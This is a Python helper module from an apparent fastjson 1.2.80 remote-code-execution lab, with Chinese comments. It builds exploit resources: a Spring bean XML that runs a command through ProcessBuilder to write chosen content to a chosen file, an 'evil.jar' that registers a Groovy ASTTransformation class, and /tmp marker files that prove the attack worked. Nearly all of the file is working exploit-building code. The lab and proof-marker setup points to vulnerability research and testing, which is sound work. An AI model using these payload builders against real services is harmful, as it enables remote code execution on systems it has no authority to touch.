"""1.2.80 RCE 证明用攻击资源：bean.xml / evil.jar。"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
ATTACK_SRC = ROOT / "lab" / "fastjson-1280-lab" / "attack"


def build_bean_xml(file: str, content: str) -> bytes:
    """Spring XML：ProcessBuilder 将 content 写入 file。"""
    tpl = (ATTACK_SRC / "bean-write.xml.template").read_text(encoding="utf-8")
    # XML 文本节点内转义
    esc_content = (
        content.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )
    esc_file = (
        file.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )
    # shell 单引号包裹 content，避免空格问题；模板用 printf '...'
    body = tpl.replace("__CONTENT__", esc_content.replace("'", "'\\''")).replace(
        "__FILE__", esc_file
    )
    return body.encode("utf-8")


def build_evil_jar() -> bytes:
    """打包 Groovy ASTTransformation SPI jar（含已编译 class 若存在，否则仅源码占位）。

    优先使用 lab 构建产物 attack/evil.jar；否则尝试现场 javac（需 groovy 在 classpath）。
    """
    prebuilt = ATTACK_SRC / "evil.jar"
    if prebuilt.is_file():
        return prebuilt.read_bytes()

    # 最小可加载 jar：只有 SPI 文件时不足以写文件；必须由 Dockerfile 预编译
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
            "fj1280.EvilAst\n",
        )
        zf.writestr(
            "README.txt",
            "Build with lab/fastjson-1280-lab Dockerfile (attack/evil.jar).\n",
        )
    return buf.getvalue()


def marker_for(gadget: str) -> tuple[str, str]:
    """返回 (path, content) 证明文件。"""
    content = f"FJ1280_{gadget.upper()}"
    return f"/tmp/fj1280_{gadget}", content
